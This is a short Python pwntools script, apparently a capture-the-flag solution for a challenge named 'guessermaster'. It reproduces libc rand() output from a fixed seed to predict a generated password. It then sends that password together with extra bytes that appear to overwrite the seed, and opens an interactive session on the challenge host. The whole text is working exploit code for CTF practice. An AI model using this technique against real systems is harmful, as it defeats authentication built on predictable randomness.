from pwn import *
from ctypes import CDLL
from ctypes.util import find_library
libc = CDLL(find_library("c"))

r = remote("guessermaster.challs.olicyber.it", 35006)

r.recv(100)

password = [""] * 256
libc.srand(int.from_bytes(b"\x00\x00\x00\x01", "little"))
for i in range(255):
    rand_n = libc.rand()
    password.append(chr(rand_n + (rand_n // 25) * -25 + ord('A')))

payload = "".join(password).encode() + b"\x00"
payload += b"\x00\x00\x00\x01"

r.sendline(payload)
r.interactive()